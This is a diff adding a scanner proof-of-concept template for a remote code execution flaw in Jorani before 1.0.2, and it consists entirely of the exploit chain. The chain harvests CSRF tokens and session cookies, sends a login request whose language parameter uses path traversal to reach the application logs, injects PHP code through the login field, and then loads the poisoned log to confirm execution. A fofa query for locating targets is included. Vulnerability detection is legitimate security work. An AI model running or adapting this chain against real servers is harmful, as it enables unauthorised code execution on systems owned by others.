@@ -1,0 +1,35 @@
+id: poc-yaml-jorani-login-remote-code-execution
+info:
+  name: Jorani < 1.0.2 远程命令执行
+  severity: critical
+  tags:
+  - rce
+  finger: Jorani
+  fofa: title="Jorani"
+variables:
+  t1: random_int(1000,10000)
+  t2: md5(t1)
+  datetime: datetime("2006-01-02")
+requests:
+- method: GET
+  path: /session/login
+  output:
+  - regex_match(body,"name=\"csrf_test_jorani\" value=\"(?P<csrf>.*?)\"")
+  - regex_match(headers, "csrf_cookie_jorani=(?P<csrf_cookie_jorani>.*?);")
+  - regex_match(headers, "jorani_session=(?P<jorani_session>.*?);")
+  expression: status_code == 200
+- method: POST
+  path: /session/login
+  headers:
+    Content-Type: application/x-www-form-urlencoded
+    Cookie: csrf_cookie_jorani={{.csrf_cookie_jorani}}; jorani_session={{.jorani_session}}
+  data: csrf_test_jorani={{.csrf}}&last_page=session%2Flogin&language=..%2F..%2Fapplication%2Flogs&login=<?php
+    echo(md5({{.t1}}));?>&CipheredValue=DummyPassword
+  expression: status_code == 302 || status_code == 303
+- method: GET
+  path: /pages/view/log-{{.datetime}}
+  headers:
+    X-REQUESTED-WITH: XMLHttpRequest
+    Cookie: csrf_cookie_jorani={{.csrf_cookie_jorani}}; jorani_session={{.jorani_session}}
+  expression: contains(body,t2)
+transport: http
